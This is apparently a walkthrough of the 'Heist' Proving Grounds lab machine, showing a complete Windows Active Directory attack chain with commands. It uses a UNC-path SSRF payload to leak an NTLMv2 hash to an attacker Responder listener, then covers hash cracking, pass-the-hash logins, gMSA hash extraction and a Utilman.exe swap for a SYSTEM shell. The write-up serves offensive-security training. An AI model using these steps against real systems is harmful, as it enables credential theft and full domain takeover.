# Heist — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Windows (Active Directory)

---

## TL;DR

Werkzeug web server on port 8080 acts as middleware → Inject UNC path into `?url=` parameter to capture NTLMv2 hash via Responder → Crack hash to get `enox` credentials → BloodHound maps relationship to `svc_apache$` (gMSA) → Extract gMSA hash via GMSAPasswordReader → Evil-WinRM → SeRestorePrivilege abuse for NT AUTHORITY\SYSTEM.

---

## Enumeration

```bash
nmap -sV -p- 192.168.187.165
```

**Open Ports:**
- **53, 88, 135, 139, 445**: Standard AD/Domain Controller ports
- **389, 636, 3268, 3269**: LDAP
- **3389**: RDP
- **5985**: WinRM
- **8080**: HTTP (Werkzeug 2.0.1)

Domain: `heist.offsec`

---

## Initial Foothold — NTLM Theft via SSRF

Port 8080 hosts a custom web service utilizing an `url` parameter:
```text
http://192.168.215.165:8080/?url=...
```

To test if the backend server attempts to authenticate to external resources, we start **Responder** on our Kali machine:
```bash
responder -A -I tun0
```
*Note: Using `-A` (Analyze Mode) prevents active spoofing, which is crucial for PG/OSCP compliance.*

We inject a UNC path pointing to our Kali IP into the URL:
```text
http://192.168.215.165:8080/?url=\\192.168.45.209\test
```

The Windows server attempts to reach out and in doing so, provides its NTLMv2 hash to Responder:
`enox::HEIST:d5015b8619a5ed44...`

We crack this using `hashcat`:
```bash
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt
# Yields: enox:california
```

We use Evil-WinRM to log in:
```bash
evil-winrm -i 192.168.215.165 -u enox -p california
```

---

## Privilege Escalation — GMSA and SeRestore

With a shell, we upload `SharpHound.ps1` and collect domain data.
Loading the data into BloodHound, we find `enox` has delegated control over the **Group Managed Service Account (gMSA)** `svc_apache$`.

We leverage a tool called [GMSAPasswordReader](https://github.com/CsEnox/just-some-stuff/tree/main) to extract the NT hash for this service account:
```powershell
.\GMSAPasswordReader.exe --accountname svc_apache
# NT Hash: A266E0F8D19F9CDB92AD8C658F86AFFA
```

Log back in via WinRM using the acquired hash:
```bash
evil-winrm -i 192.168.178.165 -u svc_apache$ -H A266E0F8D19F9CDB92AD8C658F86AFFA
```

Checking privileges:
```cmd
whoami /priv
```
We have **`SeRestorePrivilege`**. 

Using tools from [Priv2Admin](https://github.com/gtworek/Priv2Admin), we enable the privilege, then rename `Utilman.exe` to `.old` and replace it with `cmd.exe`. 
Via RDP (`rdesktop`), at the login screen, we trigger the Accessibility options (Win+U), which immediately gives us a **SYSTEM** shell. 🎉

---

## Key Takeaways

- **SSRF to NTLM Theft:** URL/SSRF parameters on Windows web servers are phenomenal for directing traffic to an external `Responder` listener to harvest NTLMv2 hashes.
- **gMSA Abuse:** Group Managed Service Accounts have rotating passwords managed by AD. If your captured user has read privileges on the gMSA, you can extract its hash programmatically.
- **SeRestorePrivilege:** Allows overriding file permissions. Replacing binaries like `Utilman.exe` and triggering them via RDP is a classic escalation path.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
